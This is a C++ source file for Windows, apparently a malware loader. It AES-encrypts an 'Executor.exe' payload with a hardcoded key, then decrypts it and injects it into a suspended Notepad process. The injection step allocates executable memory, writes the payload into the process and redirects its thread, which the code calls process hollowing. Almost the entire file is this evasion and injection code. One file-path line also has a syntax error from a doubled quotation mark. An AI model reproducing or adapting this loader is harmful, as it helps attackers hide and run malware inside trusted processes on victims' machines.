#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <base64.h>  // From Crypto++
#include <aes.h>     // From Crypto++
#include <modes.h>   // From Crypto++
#include <filters.h> // From Crypto++
#pragma comment(lib, "advapi32.lib")

// AES Key (16 bytes)
const byte AES_KEY[16] = { 'S', 'i', 'x', 't', 'e', 'e', 'n', ' ', 'b', 'y', 't', 'e', ' ', 'k', 'e', 'y' };

// File paths
const std::string BASE_PATH = "C:\\The\\Path\\To\\Your\\Payloads\\"; // Modify Here
const std::string EXECUTOR_PATH = BASE_PATH + "Executor.exe";
const std::string ENCRYPTED_PATH = BASE_PATH + "Executor.enc";


// Read file into a byte vector
std::vector<byte> readFile(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    return std::vector<byte>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Write byte vector to file
void writeFile(const std::string& filepath, const std::vector<byte>& data) {
    std::ofstream file(filepath, std::ios::binary);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// AES Encryptor
std::vector<byte> encryptAES(const std::vector<byte>& data) {
    using namespace CryptoPP;
    ECB_Mode<AES>::Encryption encryptor(AES_KEY, sizeof(AES_KEY));

    std::vector<byte> encrypted;
    StringSource(data.data(), data.size(), true,
        new StreamTransformationFilter(encryptor, new VectorSink(encrypted))
    );

    return encrypted;
}

// AES Decryptor
std::vector<byte> decryptAES(const std::vector<byte>& data) {
    using namespace CryptoPP;
    ECB_Mode<AES>::Decryption decryptor(AES_KEY, sizeof(AES_KEY));

    std::vector<byte> decrypted;
    StringSource(data.data(), data.size(), true,
        new StreamTransformationFilter(decryptor, new VectorSink(decrypted))
    );

    return decrypted;
}

// Encrypt Executor.exe
bool encryptExecutor() {
    std::cout << "[ENCRYPTION] Encrypting Executor.exe..." << std::endl;

    std::vector<byte> data = readFile(EXECUTOR_PATH);
    if (data.empty()) {
        std::cerr << "[ERROR] Failed to read Executor.exe!" << std::endl;
        return false;
    }

    std::vector<byte> encryptedData = encryptAES(data);
    writeFile(ENCRYPTED_PATH, encryptedData);

    std::cout << "[ENCRYPTION] File encrypted successfully." << std::endl;
    return true;
}

// Decrypt and Perform Process Hollowing
bool decryptAndHollow() {
    std::cout << "[DECRYPTION] Decrypting Executor.enc..." << std::endl;

    std::vector<byte> encryptedData = readFile(ENCRYPTED_PATH);
    if (encryptedData.empty()) {
        std::cerr << "[ERROR] Failed to read encrypted file!" << std::endl;
        return false;
    }

    std::vector<byte> decryptedData = decryptAES(encryptedData);
    std::cout << "[DECRYPTION] Successfully decrypted payload." << std::endl;

    // Save decrypted file for debugging
    writeFile(""C:\\The\\Path\\To\\store\\Your\\\\encrypted\\Payloads\\bin\\decrypted_payload.bin", decryptedData); // Modify Here
    std::cout << "[DEBUG] Decrypted payload saved." << std::endl;

    // --- Start 32-bit Notepad in Suspended Mode ---
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess("C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[ERROR] Failed to start 32-bit Notepad. Error: " << GetLastError() << std::endl;
        return false;
    }

    DWORD pid = pi.dwProcessId;
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    std::cout << "[PROCESS] 32-bit Notepad launched with PID: " << pid << std::endl;

    // Allocate memory in Notepad process
    LPVOID allocAddr = VirtualAllocEx(hProcess, NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocAddr) {
        std::cerr << "[ERROR] Memory allocation failed! Error: " << GetLastError() << std::endl;
        return false;
    }
    std::cout << "[MEMORY] Allocated memory at: " << allocAddr << std::endl;

    // Write decrypted payload into allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, allocAddr, decryptedData.data(), decryptedData.size(), &bytesWritten)) {
        std::cerr << "[ERROR] WriteProcessMemory failed! Error: " << GetLastError() << std::endl;
        return false;
    }
    std::cout << "[MEMORY] Bytes written: " << bytesWritten << std::endl;

    // --- Modify Notepad's Thread Context ---
    WOW64_CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!Wow64GetThreadContext(hThread, &ctx)) {
        std::cerr << "[ERROR] Wow64GetThreadContext failed! Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "[DEBUG] Original EAX: " << std::hex << ctx.Eax << std::endl;

    // Modify EAX to point to allocated memory
    ctx.Eax = (DWORD_PTR)allocAddr;
    std::cout << "[DEBUG] New EAX: " << std::hex << ctx.Eax << std::endl;

    if (!Wow64SetThreadContext(hThread, &ctx)) {
        std::cerr << "[ERROR] Wow64SetThreadContext failed! Error: " << GetLastError() << std::endl;
        return false;
    }

    // Resume Thread and Execute
    ResumeThread(hThread);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    std::cout << "[SUCCESS] Process Hollowing Completed!" << std::endl;
    return true;
}

// Main function
int main() {
    if (encryptExecutor()) {
        decryptAndHollow();
    }
    return 0;
}
